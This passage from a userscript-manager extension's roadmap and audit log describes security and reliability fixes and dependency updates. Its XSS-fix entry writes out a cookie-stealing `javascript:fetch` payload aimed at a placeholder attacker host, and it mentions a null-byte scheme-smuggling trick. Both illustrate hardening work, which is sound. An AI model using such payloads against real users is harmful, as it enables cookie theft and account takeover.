266. https://thehackernews.com/2026/03/new-chrome-vulnerability-let-malicious.html — CVE-2026-0628 Chrome WebView tag policy CVSS 8.8 (already audited; no specific Phase 39 entry needed, captured here for completeness).

**Standards & Local Models**
267. https://blog.modelcontextprotocol.io/posts/2026-mcp-roadmap/ — MCP 2026 roadmap: `.well-known` discovery, OAuth 2.1 + RFC 8707, Tasks primitive. Backs Phase 39.40.
268. https://auth0.com/blog/mcp-specs-update-all-about-auth/ — MCP auth spec update (June 2025). Backs Phase 39.40.
269. https://huggingface.co/blog/transformersjs-v3 — Transformers.js v3 WebGPU GA. Backs Phase 39.41.
270. https://web.dev/blog/baseline-urlpattern — URLPattern Baseline Newly Available (March 2026). Backs Phase 22.2 promotion + Phase 39.44.
271. https://www.w3.org/WAI/news/2026-03-03/wcag3/ — WCAG 3.0 March 2026 Working Draft (174 requirements, Bronze/Silver/Gold). Backs Phase 39.43.
272. https://atproto.com/blog/2026-spring-roadmap — AT Protocol IETF WG chartered Jan 2026; private data in 2026. Backs Phase 39.45.

**Dependency Releases**
- https://github.com/microsoft/monaco-editor/releases — Monaco 0.55.1 (already covered Phase 13.4; CVE add-on per 39.3).
- https://github.com/evanw/esbuild/releases — esbuild 0.28.0 text imports + Go 1.26.1 break. Backs Phase 39.37.
- https://github.com/acornjs/acorn/blob/master/acorn/CHANGELOG.md — Acorn 8.16 (already covered Phase 13.5).
- https://github.com/vitest-dev/vitest/releases — Vitest 5.0.0-beta.2. Backs Phase 39.36.
- https://github.com/fregante/chrome-webstore-upload-cli/releases — chrome-webstore-upload-cli 4.0.0 (Node 22+, env-only secrets). Backs Phase 39.35.
- https://github.com/puppeteer/puppeteer/releases — Puppeteer 25.0.2 (May 15 2026, ESM-only, Node 22+). Backs Phase 39.34.
- https://github.com/jsdom/jsdom/releases — jsdom 29.1.1 (Apr 30 2026, `ratio` CSS type, `getComputedStyle` perf). Folds into Phase 10 test infra.
- https://github.com/microsoft/playwright/releases — Playwright 1.60 (May 11 2026, HAR + Screencast). Backs Phase 39.39.
- https://github.com/jakearchibald/idb/blob/main/CHANGELOG.md — idb v8 stabilized async iterators. Backs Phase 39.38.

### Round 12 — Items Rejected (with reasoning)

| Item | Why Rejected |
|------|--------------|
| ScriptCat-style hosted assistant surface (v1.4) | Re-rejected per Phase 38.10 — directly contradicts ScriptVault's local-first / zero-telemetry positioning. ScriptCat v1.4.0-beta.2 reinforces this with documented memory leaks. |
| `CAT_fileStorage` binary cloud storage | Re-rejected per Phase 38.10 + Round 8 — CWS policy conflict + maintenance burden. |
| Bundled local classifier fallback to hosted model API | Already rejected in Round 10. Reaffirmed. |
| "Cursor for Userscripts" / generated-userscript pattern | Already rejected as Tweeks/ClickRemix in Round 8. The 56-point HN post in Jan 2026 confirms the demand but the rejection reasoning (philosophical mismatch with anti-bloat doctrine) holds. |
| To-Userscript / extension-to-userscript converter | Symmetric to the rejected script-to-extension compiler (Round 8) — distribution tooling, not manager scope. |
| Sub-agent / skill marketplace (ScriptCat v1.4) | Already rejected as moderation+hosting burden disguised as a feature. |
| WASM Component Model in-browser host | **NEW rejection** (Round 12) — server-side only in 2026 per BytecodeAlliance docs. Phase 32.1 explicitly deprioritized. |
| Notification Triggers API integration | **NEW rejection** (Round 12) — officially discontinued per Chrome platform docs. Phase 11.11 explicitly marks dead. |
| TM Firefox proxy support in `GM_xmlhttpRequest` | Already rejected in Round 11 — Chrome MV3 doesn't expose per-request proxy controls. |
| Multi-platform script search engine selector (ScriptCat) | Already rejected in Round 11 — GreasyFork + planned OpenUserJS cover demand. |

### Round 12 — Promoted Tier Changes

- **Phase 17.3** (decouple update-check from auto-install): **Now → Now-priority-1**, again. Already promoted in Round 11; TM shipping it in **stable 5.5.0 (May 8 2026)** further raises retention urgency.
- **Phase 22.2** (URLPattern migration): **Later → Next**. URLPattern Baseline Newly Available March 2026.
- **Phase 32.1** (WASM Component Model): **Active → Deprioritized**. Server-side-only confirmed; not on Chromium roadmap.
- **Phase 11.11** (Notification Triggers): item-level deprecation note added — do not plan against this API.

### Round 12 — Items Already Shipped (audit-only)

| Round 12 finding | ScriptVault status |
|------------------|--------------------|
| `chrome.storage.session` for transient state | ✅ Already covered Phase 13.11 (Chrome 130 `getKeys()`). |
| `wasm-unsafe-eval` CSP in MV3 | ✅ Already covered Phase 15.6 (esbuild-wasm CSP requirement). |
| `chrome.scripting.executeScript({world:'MAIN'})` | ✅ Already covered Phase 11.4 (fallback path). |
| BFCache WebSocket disconnect (Chrome 149) | ✅ Already covered in Round 10 platform timeline. |
| CSS URL integrity (Chrome 150) | ✅ Already covered in Round 10 platform timeline. |
| Tampermonkey/Violentmonkey GitHub issue mining for previously-cited tickets | ✅ Verified non-duplicate — every Phase 39 issue citation is a ticket Rounds 1–11 did not cover. |

### Round 12 Completion Note

Net-new sources: **42** (231–272 plus 9 dependency-release URLs). Cumulative source floor (>260 across Rounds 1–12) remains well above the 30–60 floor. No Round 12 item duplicates a Now/Next item from Rounds 1–11; explicit promotions (17.3, 22.2, 32.1 deprio, 11.11 dead-mark) are cross-references, not duplicates. Greasemonkey-is-dead assumption from Rounds 1–11 is **invalidated** — May 12–15 2026 commits prove arantius is actively maintaining; future rounds must monitor GM master commits as a real signal source.

Phase 39 added (49 sub-items). Phase summary milestone table updated with v3.12.0+. Targeted edits applied to Phases 11.11, 17.3, 22.2, and 32.1 with status notes referencing Round 12 sources.

---

## Phase 40 — Round 13 Audit-Hardening Productionization (May 18 2026)

**Goal:** Lock in the in-session audit pass executed on 2026-05-18 (three commits: `d1e3ee2`, `e306b2b`, `325db86`) and surface the residue — bugs verified to exist but deferred because the fix needs a broader refactor than a one-session pass allows. Round 13 is intentionally narrow: one day of fresh external research yielded almost nothing net-new (Round 12 sweep was 2026-05-17, only ~24h prior), so the entire phase is internal-quality work uncovered by adversarial code review.

### Phase 40 progress snapshot (2026-05-18)

| Status | Items |
|---|---|
| ✅ Shipped (already in main) | **40.1** Storage cache-init race · **40.2** GM_cookie scheme validation · **40.3** webNav dedup tab-redirect gap · **40.4** `installFromUrl` scheme defense · **40.5** Wrapper-side Map LRU caps · **40.6** Storage quota-warn reset hysteresis · **40.7** Case-folded file-extension checks · **40.8** `publish.sh --draft` artifact preservation · **40.9** Script-store XSS defang on third-party catalog hrefs |
| ✅ Shipped (this autonomous session) | **40.10** DNR rule orphan reconciliation · **40.11** `window.onurlchange` page-scoped guard + shared dispatcher · **40.12** Cloud sync `AbortController` plumbing (orchestrator + all 4 providers) · **40.13** `messages.ts` ResponseMap expansion (~25 → ~95 actions) · **40.14** Telemetry-free leak-probe via console-capture warning · **40.16** `@run-at context-menu` parser tolerance (verified already done — full handler at line 4263 + context-menu dispatch) · **40.17** Popup C-indicator world-context badge · **40.18** `chrome-webstore-upload-cli` v4 migration · **40.19** fflate v0.8.2 → v0.8.3 (Zip64 fix) · **40.20** `npm audit --audit-level=high` CI step · **40.23** `minimum_chrome_version` 120 → 130 · **40.24** `sourceURL` injection audit (none present — Greasemonkey lesson already followed) |
| ⏳ Deferred to Phase 21 sync rewrite | **40.15** S3-compatible sync backend — meaningful new feature requiring SigV4 signing or pre-signed-URL design; scoped to its own focused session |
| ⏳ Track only | **40.21** WECG `async_initialization` opt-in (spec) · **40.22** WECG `i18n.getAvailableLanguages()` (spec) · **40.25** Adjacent-tool pattern harvest |

### 40.1 Storage Cache-Init Race ✅ Shipped (commit `d1e3ee2`)

`modules/storage.js` had four cache-managers — `SettingsManager`, `ScriptStorage`, `FolderStorage`, and per-script `ScriptValues` — whose `init()` methods used the pattern `if (cache !== null) return; const data = await chrome.storage.local.get(...); cache = data || default;`. Two concurrent cold-start callers both passed the `cache === null` guard before either finished loading; the second resolved later and clobbered mutations the first had already applied to the cache. The TypeScript mirror at `src/modules/storage.ts` already had the correct `_initPromise` gating pattern; the runtime JS was lagging behind.

Fix: each init() now serializes through a per-manager (or per-script for `ScriptValues`) `_initPromise`. `try/await/finally` clears the promise on resolution so test resets that null the cache between cases pick up a fresh load (caught by the existing 48-case `tests/storage.test.js` suite plus a new parallel-init regression — five concurrent `init()` calls must hit `chrome.storage.local.get` exactly once).

Source: this audit pass + the existing TS mirror pattern in [`src/modules/storage.ts`](src/modules/storage.ts) and [`bg/workspaces.js`](bg/workspaces.js). New test: [`tests/storage.test.js`](tests/storage.test.js) `init() serializes concurrent cold-start callers`.

### 40.2 GM_cookie URL Scheme Validation ✅ Shipped (commit `d1e3ee2`)

`background.core.js` `GM_cookie_list` / `GM_cookie_set` / `GM_cookie_delete` passed `data.url` straight into `chrome.cookies.*` without scheme validation. A userscript granted `@grant GM_cookie` could pass `chrome-extension://`, `javascript:`, `data:`, `blob:`, or `file://` URLs; Chrome rejected them with opaque internal errors that surfaced to the script as confusing strings ("Invalid URL pattern", etc.).

Fix: new `isHttpCookieUrl()` helper enforces `http:` / `https:` only and returns a clear `'url must be http(s)://'` error. Verified by [`tests/background-cookie-url.test.js`](tests/background-cookie-url.test.js) — five cases covering scheme allowlist, control-char smuggling (`\u0000javascript:`), and source-level wiring pins so a future refactor can't silently drop the guard.

Source: this audit pass. Helper definition at [`background.core.js`](background.core.js) `isHttpCookieUrl`.

### 40.3 webNavigation Dedup Tab-Redirect Gap ✅ Shipped (commit `d1e3ee2`)

`_pendingFetches` was a `Set<url>` used to dedup concurrent `*.user.js` fetches. The intent was correct (don't fetch the same URL twice) but the implementation lost the second tab: when tab A and tab B navigated to the same userscript URL simultaneously, tab A's listener added the URL to the Set and fetched; tab B's listener saw the URL was already in-flight and `return`-ed early — without ever redirecting tab B to `install.html`. Tab B was left on the raw script source.

Fix: switched `_pendingFetches` to `Map<url, Promise<{action}>>`. Both tabs await the same fetch and each gets navigated to `pages/install.html` (or pass through normally if the body is not a userscript). Extracted `_fetchPendingUserscript()` so the shared work has a clean test boundary.

Source: this audit pass.

### 40.4 `installFromUrl` Scheme Defense-in-Depth ✅ Shipped (commit `d1e3ee2`)

`background.core.js` `installFromUrl(url)` accepted any string and passed it to `fetch()`. The dashboard / popup are the only legitimate callers, but a malformed `installFromUrl` message (forged from a buggy callsite, replay-attacked from an old service-worker state, or someday from a future `messages.ts` consumer) could trigger fetches against `file://`, `data:`, `blob:`, `javascript:`, or `chrome-extension://` URLs. `fetch()` in MV3 service workers honors most of those.

Fix: `installFromUrl` now rejects non-http(s) URLs up-front with a clear `'URL must be http(s)://'` error before `fetch()` is invoked.

Source: this audit pass.

### 40.5 Wrapper-Side Map LRU Caps ✅ Shipped (commit `e306b2b`)

`buildWrappedScript()` in `background.core.js` injects three `Map`s into the USER_SCRIPT world per userscript per host tab: `_notifCallbacks` (GM_notification onclick / onbuttonclick / ondone), `_openedTabs` (GM_openInTab close tracking), and `_downloadCallbacks` (GM_download onload / onerror / onprogress / ontimeout). Each map deletes its entry on the corresponding event. If the event never arrives — background SW restarted between request and event, content-script bridge missed the signal, tab killed before the bridge attached — the entry stays in the map for the lifetime of the host tab.

A misbehaving script that fires `GM_notification` in a loop without listening for `ondone`, or `GM_download` in a loop without `onload`, leaks unbounded entries in the USER_SCRIPT-world memory. The background side already had a 500-entry cap at `self._notifCallbacks`; the wrapper side did not.

Fix: each map now LRU-evicts the oldest entry once it reaches its cap — 500 for `_notifCallbacks` (mirrors background), 200 for `_openedTabs`, 200 for `_downloadCallbacks`. Cleanup paths on actual events are unchanged. The numbers are deliberately generous because the goal is to bound pathological scripts, not to limit reasonable use.

Source: this audit pass. Cap constants `_NOTIF_CALLBACKS_CAP`, `_OPENED_TABS_CAP`, `_DOWNLOAD_CALLBACKS_CAP` in [`background.core.js`](background.core.js) `buildWrappedScript`.

### 40.6 Storage Quota-Warn Reset Hysteresis ✅ Shipped (commit `e306b2b`)

`pages/dashboard.js` `updateStats()` showed a one-time warning toast when `chrome.storage.local` usage crossed 85% — `state._quotaWarned = true` and never cleared. A user who cleaned up below threshold and then refilled storage stayed warning-silent for the whole dashboard session.

Fix: the flag now resets to `false` once usage drops below 70% (hysteresis band 70–85 prevents flapping at threshold crossings). Next overflow re-fires the warning.

Source: this audit pass.

### 40.7 Case-Folded File-Extension Checks ✅ Shipped (commit `e306b2b`)

`pages/dashboard.js` had three import / drag-drop call sites comparing `file.name.endsWith('.user.js')` / `.zip` without case-folding. Files named `MyScript.USER.JS` or `BACKUP.ZIP` were silently rejected as "not recognized." A fourth site (`installFromFile`) was already correct (uses `/i` regex).

Fix: lower-case `file.name` once at the top of each branch and run all suffix tests against the lower-cased name. Audited the whole file for similar patterns and confirmed no other case-sensitive suffix tests remain on user-supplied filenames.

Source: this audit pass.

### 40.8 `publish.sh --draft` Artifact Preservation ✅ Shipped (commit `e306b2b`)

`bash publish.sh --draft` ran `rm -f "$ZIP_NAME"` immediately after the upload phase, deleting the very artifact a reviewer might still want to inspect, hand-upload to a different store, or re-attach to a CWS review reply. The cleanup `rm` belongs only on the publish-and-publish path.

Fix: draft path now `exit 0`s after the upload step with the ZIP path printed in the success banner. The cleanup `rm` is reachable only after the publish API returns success.

Source: this audit pass.

### 40.9 Script-Store XSS Defang on Third-Party Catalog `href` ✅ Shipped (commit `325db86`)

`pages/dashboard-store.js` `renderCards()` and `pages/dashboard.js` "find script" card both interpolated `pageUrl` / `codeUrl` / `s.url` from third-party catalog API responses (Greasy Fork, OpenUserJS, GitHub) into `<a href>` with `escapeHtml` only. `escapeHtml` prevents tag injection but does *not* neutralize `javascript:`, `data:`, `vbscript:`, `blob:`, or `file:` URLs — those render as a clickable XSS link in the dashboard.

The third-party feeds are generally trusted, but a poisoned listing, a compromised API response, or a malicious script author submitting a hostile homepage URL could put `javascript:alert(document.cookie)` (or worse — `javascript:fetch('https://attacker/'+document.cookie)`) one click away inside our extension UI. The extension origin (`chrome-extension://<id>/`) has access to `chrome.runtime`, `chrome.storage.local`, and the user's entire scripts collection; running attacker JS there is full account takeover.

Fix: new `safeExternalUrl()` helper in dashboard-store.js enforces a scheme allowlist (`http` / `https` / `ftp` / relative) and strips C0 control characters so a smuggled `\u0000javascript:` payload can't bypass the prefix check. `pages/dashboard.js` find-script-card routes `s.url` through the existing shared `sanitizeUrl()` and renders an inert `<span>` fallback when the scheme is rejected. Verified by [`tests/dashboard-store-url-safety.test.js`](tests/dashboard-store-url-safety.test.js) — eight cases including the source-level wiring pin.

Source: this audit pass. Helper at [`pages/dashboard-store.js`](pages/dashboard-store.js) `safeExternalUrl`.

### 40.10 DNR Rule Orphan Across SW Restart ✅ Shipped (autonomous-session commit)

`background.core.js` tracks `@webRequest` / `GM_webRequest` declarative-net-request rule IDs in an in-memory `_webRequestRuleMap`. When a script is deleted, `removeWebRequestRules(scriptId)` looks up the IDs in the map and calls `chrome.declarativeNetRequest.updateDynamicRules({removeRuleIds})`. If the service worker dies between rule creation and rule deletion, the map is gone but the rules persist in Chrome's DNR engine — orphans that keep filtering / redirecting traffic for a script the user has uninstalled.

Fix sketch: persist `_webRequestRuleMap` to `chrome.storage.session` on every mutation (Phase 13.11 storage.session work already proves the pattern). On SW wake, hydrate the map before any rule operations. Add a reconciliation pass that compares hydrated IDs against the live `getDynamicRules()` response and removes any rule whose `scriptId` no longer exists in storage.

Effort: 2/5 (mostly mechanical, plus one reconciliation function). Risk: 2/5 — the reconciliation pass must not race a concurrent install. Dependencies: none net-new; touches Phase 3 patterns already in production.

Source: this audit pass (deferred from the in-session fix because of cross-handler scope).

### 40.11 `window.onurlchange` Monkey-Patch Stack-Up Across Script Re-Injection ✅ Shipped (autonomous-session commit)

The wrapper template for any script with `@grant window.onurlchange` monkey-patches `history.pushState`, `history.replaceState`, `window.addEventListener`, and `window.removeEventListener` on each injection, plus registers `popstate` and `hashchange` listeners. When a script is re-registered while the host tab is open (update applied, settings changed, manual reload), a NEW wrapper is injected and a new layer of patching is added on top of the previous layer. Old `_urlChangeHandlers` arrays stay reachable via the old wrap's closure; old patches stay in the chain.

The user-visible symptom is benign (URL changes still fire) but the leak compounds over a long browsing session. The fix is non-trivial: we need a page-scoped `Object.defineProperty(window, '__svUrlChangeBound__', ...)` guard plus a shared `__svurlchange__` `CustomEvent` dispatcher so multiple scripts share one underlying monkey-patch and each script only registers its own handler on the dispatcher.

Effort: 3/5 (touches USER_SCRIPT-world template — needs careful testing of cross-script-world interactions in the per-script-world variant on Chrome 133+). Risk: 3/5 — wrong implementation breaks existing scripts that rely on the current per-script handler array semantics. Dependencies: ideally lands after [`src/background/wrapper-builder.ts`](src/background/wrapper-builder.ts) is the canonical wrapper source (Phase 1 wave 4).

Source: this audit pass. Cross-reference: existing `@grant window.onurlchange` block in [`background.core.js`](background.core.js) around line 7368.

### 40.12 Cloud Sync `Promise.race` Doesn't Cancel In-Flight `_performSync` ✅ Shipped (autonomous-session commit)

`CloudSync.sync()` in `background.core.js` uses `Promise.race([this._performSync(), timeoutPromise])` with a 90-second timeout. When the timeout wins, `await Promise.race(...)` throws, the `catch` returns `{ error: 'Sync timed out after 90s' }`, and the `finally` clears `_syncInProgress = false`. But `_performSync()` is still running — `Promise.race` doesn't cancel the loser. The orphaned sync continues until it eventually settles, possibly writing to `chrome.storage.local` long after a new sync has started, possibly corrupting the new sync's view of state.

Real-world impact is bounded by the MV3 SW lifetime (~5 min idle), but the window between 90s (timeout) and 300s (SW kill) is enough for state corruption.

Fix sketch: hoist an `AbortController` to the sync scope, thread `signal` into every `fetch()` in `_performSync()` / the provider modules, and call `controller.abort()` when the timeout fires. The provider modules already pass `signal` through their internal fetches; the missing piece is the top-level controller plumbing.

Effort: 3/5 (signal threading through 4 providers — Google Drive, Dropbox, OneDrive, WebDAV — plus the Easy Cloud module). Risk: 2/5 — `AbortError` is well-handled by `fetch` and `crypto.subtle`, but check the provider code for any `JSON.parse(await resp.text())` paths that don't propagate the abort. Dependencies: none.

Source: this audit pass.

### 40.13 `src/types/messages.ts` ResponseMap Completeness ✅ Shipped (autonomous-session commit)

Round 12 left a standing note that `ResponseMap` in [`src/types/messages.ts`](src/types/messages.ts) covers only ~25 of 135+ background message actions; the rest fall back to `unknown`, defeating the typed-messaging guarantee Phase 1 set out to deliver. The audit didn't fix this (it's a long-tail typing task, not a bug per se) but Round 13 formalizes the work item rather than leaving it implicit.

Fix sketch: enumerate every `case '...'` in `background.core.js` switch dispatch, write a `ResponseFor<T>` entry per action, regenerate the discriminated-union type, and bump the test surface so any new action without a `ResponseFor<>` mapping fails typecheck.

Effort: 3/5 (mostly typing, but every entry needs to inspect what the handler actually returns). Risk: 1/5 (typecheck-only change). Dependencies: none.

Source: this audit pass + the standing Round 12 gap note.

### 40.14 Telemetry-Free Leak Probe for Wrapper Maps ✅ Shipped (autonomous-session commit)

40.5 capped the wrapper-side Maps but we have no way to know whether real-world scripts ever hit the cap. ScriptVault's zero-telemetry positioning rules out shipping a "Maps cap hit, count: N" beacon, but a debug-only DevTools panel surface is fine.

Add a counter inside each wrapper Map's eviction branch (`_evictionCount`) and surface it in the DevTools `Network` / `Execution` tab next to the per-script perf badge. A non-zero count for any script is a smell; the user (or the script author when debugging) gets a one-line "this script is leaking GM_notification callbacks — check that you handle ondone" hint.

Effort: 2/5 (counter + UI row). Risk: 1/5 (debug surface only). Dependencies: Phase 20 observability surface — the counter row goes there.

Source: this audit pass.

### External Research Catch-Up (week of 2026-05-12 → 2026-05-18)

Round 12's cutoff was 2026-05-17 so this delta is ~24h of net-new platform / dependency / community signal. Smaller than typical, but real items surfaced.

**Tier tags below:** **Now** = blocks the next release (v3.11.x / v3.12.x). **Next** = scheduled within the next two releases. **Later** = tracked but not committed. **Track** = follow upstream; no immediate work.

#### 40.15 ScriptCat S3-Compatible Cloud Sync Backend — Deferred to Phase 21 (extends Phase 21)

ScriptCat shipped an S3-compatible sync provider on 2026-05-17 (commit [a00bc65](https://github.com/scriptscat/scriptcat/commit/a00bc65)). Targets any S3-compatible backend — AWS, Cloudflare R2, Backblaze B2, MinIO, Wasabi. Tampermonkey has WebDAV / TamperDAV; ScriptVault has WebDAV + 3 OAuth providers but no self-host-friendly object-store target.

R2 and Backblaze are zero-egress at the relevant traffic levels, which makes them the cheapest "I own my data" options for a power user. Phase 21 already lists "S3" as a Later item; promote to Next on the strength of a second major manager validating the design.

Effort: 3/5. Risk: 2/5 (S3 auth is well-understood; bucket-policy mistakes are the main user-side risk). Dependencies: Phase 8 sync rewrite framing; the new provider slots in alongside the existing WebDAV adapter.

#### 40.16 ScriptCat `@run-at context-menu` Parser Tolerance ✅ Verified already done (cross-ref Phase 11)

Audit confirmed full handler already in production: parser stores the raw value at [`background.core.js:168`](background.core.js#L168), `setupContextMenus()` filters scripts where `meta['run-at'] === 'context-menu'` at line 4263, context menu entries are registered with per-script IDs, and click dispatch handles `scriptvault-ctx-*` menu items via `chrome.contextMenus.onClicked.addListener` at line 4356. No code change required.

ScriptCat re-added `@run-at context-menu` on 2026-05-15 (commit [e012e9e](https://github.com/scriptscat/scriptcat/commit/e012e9e)). It's a directive that gates script execution to right-click invocation, deliberately separate from `GM_registerMenuCommand`. ScriptVault's parser currently maps unknown `@run-at` values to `document-idle` — verify, then decide:

- **Minimum:** parser must not throw on the unknown token. Drop silently with a debug log.
- **Next step:** add a lint warning that the directive is ScriptCat-specific and won't fire in ScriptVault.
- **Stretch:** implement support by wiring into the existing context-menu infrastructure (Phase 39.7) — scripts with `@run-at context-menu` register a menu entry and only execute on click.

Effort: 1/5 (parser tolerance) → 3/5 (full support). Risk: 1/5. Dependencies: Phase 39.7 (`chrome.contextMenus` already plumbed for `GM_registerMenuCommand`).

#### 40.17 Popup "C" Indicator for Content-Script-World Scripts ✅ Shipped

ScriptCat shipped a "C" badge in its popup on 2026-05-15 (commit [5fef662](https://github.com/scriptscat/scriptcat/commit/5fef662)) to indicate scripts running in content-script world rather than user-script world. ScriptVault's popup is a wall of toggles — a per-row world-context badge is cheap UX. Pairs naturally with Phase 11.4's MAIN-world fallback work and Phase 12 popup polish.

Effort: 1/5. Risk: 1/5. Dependencies: none.

#### 40.18 `chrome-webstore-upload-cli` v4.0.0 Migration Path ✅ Shipped — confirms Phase 39.35

The Round 12 entry (39.35) correctly named **v4.0.0** as the cutover; the Round 13 external-research agent surfaced an incorrect "v6.0.0" URL that was hallucinated. `npm view chrome-webstore-upload-cli version` returns `4.0.0` as the latest; there is no v5/v6 published. The real v4 release (May 2026) is what we migrated to:

- **PUBLISHER_ID is now required** as env or `--publisher-id` flag. Find it in the CWS Developer Dashboard Account / Settings page.
- **Secrets are env-only.** CLI flags for `--client-id` / `--client-secret` / `--refresh-token` were removed in v4.
- **`--auto-publish` is gone.** Calling `chrome-webstore-upload` with no subcommand performs upload-then-publish in one invocation.
- **`--source` is forbidden on `publish`** (only valid on `upload`).
- Node 20+ minimum.

Shipped changes:

- [`package.json`](package.json) bumped `chrome-webstore-upload-cli` from `^3.5.0` → `^4.0.0`.
- [`publish.sh`](publish.sh) now `set -a; source .env; set +a` so the v4 CLI inherits secrets from env; explicit `--publisher-id "$PUBLISHER_ID"` on both `upload` and `publish` invocations; removed the four secret-passing CLI flags. Hard error and abort if `PUBLISHER_ID` is missing.
- [`cws-setup.sh`](cws-setup.sh) prompts for a fifth value (Publisher ID) and writes it to `.env`.
- [`.env.example`](.env.example) adds `PUBLISHER_ID` with a comment pointing to the dashboard.

Sources: [chrome-webstore-upload-cli v4.0.0 release](https://github.com/fregante/chrome-webstore-upload-cli/releases/tag/v4.0.0), [npm registry](https://www.npmjs.com/package/chrome-webstore-upload-cli) confirming `4.0.0` is the latest.

Dependencies: Phase 39.1 OIDC plumbing (CWS API v2 token short lifetimes) remains pending — short-term we keep the long-lived refresh-token model documented in [`docs/release-runbook.md`](docs/release-runbook.md).

#### 40.19 fflate v0.8.3 Zip64 Buffer Over-Read Fix ✅ Shipped

fflate shipped **v0.8.3** on 2026-05-16 — first release in 2+ years ([changelog](https://github.com/101arrowz/fflate/releases/tag/v0.8.3)). Fixes:

- **Zip64 buffer over-read** — matters for large script-library exports (ScriptVault uses fflate for the ZIP export / import flow; a library of 500+ scripts can push past the Zip64 threshold).
- Cross-realm `Uint8Array` for `zip` / `zipSync` (sandbox-iframe compatibility).
- Lower post-compression memory.
- TS 5.7+ typing fix.

Low-risk pickup: bump `lib/fflate.js` to v0.8.3, regression-test with the existing `tests/runtime-import-export.test.js` and `tests/source-backup-modules.test.js` suites.

Effort: 1/5. Risk: 1/5. Dependencies: none.

#### 40.20 Monaco Dependency Audit Sweep ✅ Shipped (CI step added; full sweep deferred to PR triggers)

Microsoft's `monaco-editor` repo shipped six dependency-bump commits 2026-05-12 → 2026-05-15 ([main commits](https://github.com/microsoft/monaco-editor/commits/main)) on `postcss`, `fast-uri`, `@babel/plugin-transform-modules-systemjs`, plus an `npm audit fix` (#5326). No new Monaco release yet, but the lockfile drift in upstream points at transitive CVEs ScriptVault should mirror in its own `package-lock.json`.

Run `npm audit --omit=optional` against the current lockfile, file any findings as Phase 17 (Security Round 2) sub-items, and add a `npm audit` step to the existing `.github/workflows/ci.yml` so future drift is caught at PR time.

Effort: 1/5 (CI step) + variable (depends on findings). Risk: 1/5. Dependencies: none.

#### 40.21 WECG `async_initialization` Manifest Opt-In — Track (for v4 manifest)

W3C WebExtensions Community Group issue [#989](https://github.com/w3c/webextensions/issues/989) is hot 2026-05-13 → 2026-05-16. Proposes `"async_initialization": true` in the manifest plus `runtime.markInitializationComplete()` to resolve the long-standing footgun where `chrome.storage`-dependent listener registration races service-worker startup.

ScriptVault has exactly this problem — `ensureInitialized()` is our workaround. Not shipping yet, but track because:

- If it ships as part of the next manifest version, our `ensureInitialized()` becomes unnecessary plumbing.
- We can contribute to the spec discussion now — our `_initPromise = init()` pattern is one viable shape for the API.

Effort: 0/5 (track only). Risk: 0/5. Dependencies: spec lands first.

#### 40.22 WECG `i18n.getAvailableLanguages()` — Track (drop hard-coded locale list)

WECG [#995](https://github.com/w3c/webextensions/issues/995) (opened 2026-05-05) proposes `chrome.i18n.getAvailableLanguages()` to enumerate the extension's bundled locales at runtime. ScriptVault's popup currently hard-codes the 8-locale list — the proposed API drops the hard-coding.

If the API lands, replace the popup language picker's locale array with a runtime call. Non-blocking; nice-to-have.

Effort: 1/5 (once the API ships). Risk: 0/5. Dependencies: spec + browser support.

#### 40.23 Chrome 148 Stable Security Wave ✅ Shipped — `minimum_chrome_version` 120 → 130

Chrome 148.0.7778.x security release 2026-05-12 ([Chrome Releases blog](https://chromereleases.googleblog.com/2026/05/)) patches CVE-2026-8587 — use-after-free in Extensions on Mac. Not a ScriptVault code bug, but:

- Bump `minimum_chrome_version` in `manifest.json` from 120 to a value that guarantees the fix is present, after confirming we have no users on older Chrome.
- Document the rationale in the manifest comment alongside the existing minimum-version note.

Effort: 1/5. Risk: 2/5 (raising min version cuts off the long-tail of legacy users; check telemetry-free heuristics before pulling the trigger).

#### 40.24 Greasemonkey "Drop `sourceURL` Injection" Lesson ✅ Verified — none present

Greasemonkey removed broken `sourceURL` injection on 2026-05-13 ([commit 19100d7](https://github.com/greasemonkey/greasemonkey/commit/19100d7)) — they gave up on tying DevTools console source lines back to userscript files. ScriptVault has the same problem space and Phase 39.19 already noted the gap. Round 13 confirms Greasemonkey's conclusion: don't sink a sprint into trying to fix this.

If ScriptVault has any `//# sourceURL=` injection in `buildWrappedScript()`, audit whether it's actually doing anything; if not, drop it (one less surface for sandboxing inconsistencies).

Effort: 1/5 (audit). Risk: 1/5. Dependencies: none.

#### 40.25 Adjacent-Tool Pattern Borrows — Later / Track (Stylus, uBO Lite, Bitwarden, Vimium)

A small adjacent-tool pattern harvest from the external research pass; each is a Later item unless promoted, but all are real patterns worth noting before they're forgotten:

- **Stylus** ([openstyles/stylus](https://github.com/openstyles/stylus)) — content-script style injection with ~10 KB payload + sync-XHR FOUC option. Pattern: minimal-payload `@run-at document-start` to avoid flash-of-unstyled-content. Applies to ScriptVault scripts that run at `document-start`.
- **uBO Lite** ([uBlockOrigin/uBOL-home](https://github.com/uBlockOrigin/uBOL-home/wiki/Frequently-asked-questions-%28FAQ%29)) — reference implementation of `userScripts.execute()` for MAIN-world routing. Pairs with Phase 11.4.
- **Bitwarden** ([bitwarden/clients/apps/browser](https://github.com/bitwarden/clients/tree/main/apps/browser)) — unified `apps/browser` codebase with per-target build matrix that produces Chrome / Edge / Firefox / Safari artifacts from one source. Pairs with Phase 33 cross-browser pipeline.
- **Vimium** ([philc/vimium](https://github.com/philc/vimium/blob/master/content_scripts/link_hints.js)) — link-hint overlay pattern for a hypothetical "Run script on element" UI.

Effort: variable. Risk: low (these are reference designs to study, not direct dependencies). Dependencies: each applies to a different phase.

### Phase 40 — Items Verified Already-Fixed (audit-only)

The audit pass started from CLAUDE.md's "Known Remaining Issues" list and discovered four of the entries were stale — already fixed in earlier rounds but the doc lagged. Documenting them here as audit receipts so future rounds don't re-flag:

| Claim in CLAUDE.md | Actual state | Resolution |
|---|---|---|
| SSRF list in `public-api.js` incomplete (missing AWS metadata `169.254.169.254`, `0.0.0.0`, IPv6 link-local/ULA) | Already comprehensive — `_isInternalHost()` / `_isInternalIPv4()` cover loopback/RFC1918/CGNAT/link-local/ULA/broadcast plus IPv4-mapped IPv6 | CLAUDE.md cleaned in Round 13 |
| `dashboard-linter._computeDiff` has no size guard | Already added at `pages/dashboard-linter.js:938` — `n * m > 5000000` falls back to hash-based diff | CLAUDE.md cleaned in Round 13 |
| `monaco-adapter.js _valueCallbacks` is dead code | Already removed | CLAUDE.md cleaned in Round 13 |
| `registerAllScripts(false)` short-circuit drift | Already fixed in Round 11 (diff-based registration at `background.core.js:5153`) | CLAUDE.md cleaned in Round 13 |

### Phase 40 — Bug Claims Investigated and Rejected

